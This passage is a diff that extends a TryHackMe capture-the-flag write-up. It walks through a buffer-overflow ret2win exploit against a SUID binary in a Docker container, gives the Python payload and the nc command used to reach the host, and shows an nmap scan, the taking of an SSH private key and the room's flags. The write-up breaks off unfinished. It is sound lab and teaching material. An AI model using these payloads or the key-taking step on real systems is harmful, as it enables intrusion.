@@ -182,12 +182,197 @@ THM{1243b64a3a01a8732ccb96217f593520}
 ````
 
 ## PE to ROOT in Docker :
+i upload linpeas.sh to the box .
+First of all, we're inside a Docker container, and there are other containers running on the host. We might need to gain access to those containers later.
 
-to be continue
+![Image]({{ site.baseurl }}/images/obscure/22.png)
+ 
+there is this interesting program **ref** that has root SIUD :
+
+![Image]({{ site.baseurl }}/images/obscure/23.png)
+
+playing around we it : 
+
+![Image]({{ site.baseurl }}/images/obscure/24.png) 
+
+lemme get this program to my machine to analyse it using hydra : 
+
+copy the ret program to the db that way i can download it with the the db: 
+
+```cp /ret filestore/main/ ```
+
+![Image]({{ site.baseurl }}/images/meme/smart.png)
 
 
+As you can see, there are two interesting functions: `vuln()` and `win()`.
 
+- **`vuln()`**: This function asks us to enter some input. However, it only allocates 128 bytes to store it. If we enter more than 128 bytes, we might overwrite other important data in memory.
 
+![Image]({{ site.baseurl }}/images/obscure/25.png)
+
+- **`win()`**: This is the function we want to execute. It runs `/bin/sh`, which gives us a shell. Since the program has the SUID bit set and is owned by root, successfully calling this function could give us a root shell inside the container.
+
+![Image]({{ site.baseurl }}/images/obscure/26.png)
+
+I'll try to explain this as clearly as possible.
+
+The goal is to overwrite the saved return address so that, when `vuln()` finishes executing, the program jumps to `win()` instead of returning to its normal execution flow.
+
+As we saw earlier, the buffer holds 128 bytes, followed by another 8 bytes for the saved RBP. This means we need **136 bytes to reach the saved return address (RIP)**.
+
+![Image]({{ site.baseurl }}/images/obscure/27.png)
+
+So, our payload needs 136 bytes of padding, followed by the address of the function we want to execute. In our case, that's `win()`, which launches `/bin/sh`.
+
+By inspecting the `win()` function in Ghidra, we can identify its address: `0x400646`.
+
+![Image]({{ site.baseurl }}/images/obscure/28.png)
+
+There are two important things to keep in mind:
+
+1. **We use `win()+1` instead of calling `win()` directly.** The first instruction of `win()` is `push rbp`, which adjusts the stack by 8 bytes. Skipping this instruction helps preserve the stack alignment required by the function. Therefore, we jump to `0x400647` instead of `0x400646`.
+
+2. **Little-endian byte order:** Since we're working with an x86-64 architecture, addresses are stored in little-endian format. Luckily, Pwntools' `p64()` function handles this conversion for us.
+
+Our final payload looks like this:
+
+```python
+b"A" * 136 + p64(0x400647)
+```
+or we can convert it manialy :
+
+Our target address is:
+
+```text
+0x400647
+```
+
+However, x86-64 uses little-endian format, which means that the least significant byte (the byte on the right) is stored first in memory.
+
+So, instead of writing the address as:
+
+```text
+00 00 00 00 00 40 06 47
+```
+
+We need to reverse the byte order:
+
+```text
+47 06 40 00 00 00 00 00
+```
+
+Each `\x` tells Python that the following two hexadecimal digits represent one byte. Therefore, we can write our address as:
+
+```python
+"\x47\x06\x40\x00\x00\x00\x00\x00"
+```
+
+**But there is another way to represent the same bytes!**
+
+Some hexadecimal values correspond to printable ASCII characters:
+
+- `\x47` represents the character `G`.
+- `\x06` is a non-printable byte, so we keep it as `\x06`.
+- `\x40` represents the character `@`.
+- `\x00` represents a null byte.
+
+Therefore, we can write the exact same address in a shorter and more readable way:
+
+```python
+"G\x06@\x00\x00\x00\x00\x00"
+```
+
+Both representations produce exactly the same bytes. The important thing is that the actual bytes sent to the program remain unchanged.
+
+Now we have everything needed to build our payload:
+
+- `A` * 136: Fills the buffer and overwrites the saved RBP.
+- `G\x06@\x00\x00\x00\x00\x00`: Overwrites the saved return address with `win()+1`.
+
+Our final command using Python 2 is:
+
+```bash
+(python2 -c 'print "A"*136 + "G\x06@\x00\x00\x00\x00\x00"'; cat) | /ret
+```
+
+This sends our payload to the vulnerable program. Once `vuln()` finishes, the overwritten return address redirects execution to `win()+1`, allowing us to reach the shell command.
+
+![Image]({{ site.baseurl }}/images/obscure/29.png)
+
+**root on the container :**
+
+![Image]({{ site.baseurl }}/images/obscure/30.png)
+
+## Escapte to the box :
+
+we've seen earlier a few address on the docker container hosts file :
+
+![Image]({{ site.baseurl }}/images/obscure/22.png)
+
+the docker container ip is : **172.17.0.3**
+
+so its more likely the box ip in 172.0.17.0.1 . because the box is the getway of the Docker container 
+
+![Image]({{ site.baseurl }}/images/obscure/32.png)
+
+lets scan what open ports are on the box from the docker container : 
+
+````
+odoo@b8a9bbf1f380:/$ nmap -vv 172.17.0.1
+
+Scanning ip-172-17-0-1.eu-west-3.compute.internal (172.17.0.1) [1000 ports]
+Discovered open port 22/tcp on 172.17.0.1
+Discovered open port 21/tcp on 172.17.0.1
+Discovered open port 80/tcp on 172.17.0.1
+Discovered open port 4444/tcp on 172.17.0.1
+
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+4444/tcp open  krb524
+````
+see , i told you , the ftp,http,ssh we can see em in our first scan , but that 4444 port is new . 
+lets dig in : 
+ the same binary as before , looks like its our was to the box. let's use the same exploit as earlier :
+![Image]({{ site.baseurl }}/images/obscure/33.png)
+
+**payload:** 
+``` (python2 -c 'print "A"*136 + "G\x06@\x00\x00\x00\x00\x00"'; cat) | nc 172.17.0.1 4444 ```
+
+![Image]({{ site.baseurl }}/images/obscure/34.png)
+
+## USER FLAG :
+
+**USER FLAG:** ``` THM{43b0b68ba2755dd6cac3b8bf5454db94} ```
+
+we can donwload the id_rsa of the user **zeeshan** to log in using ssh :
+
+![Image]({{ site.baseurl }}/images/obscure/35.png)
+
+to download is simply cat the id_rsa . 
+create a file called id_rsa on your machine.
+chmod 600 id_rsa
+ssh user@ip -i id_rsa
+
+![Image]({{ site.baseurl }}/images/obscure/36.png)
+
+## PE to ROOT :
+
+another binary to root the box :
+
+![Image]({{ site.baseurl }}/images/meme/tom1.png)
+
+![Image]({{ site.baseurl }}/images/obscure/37.png)
+
+playing around :
+
+![Image]({{ site.baseurl }}/images/obscure/38.png)
+
+lets donwload it in our machine and analyse it using ghydra : 
+
+**TO BE CONT**
 
 **Special thanks to [Tryhackme](https://tryhackme.com)**
 
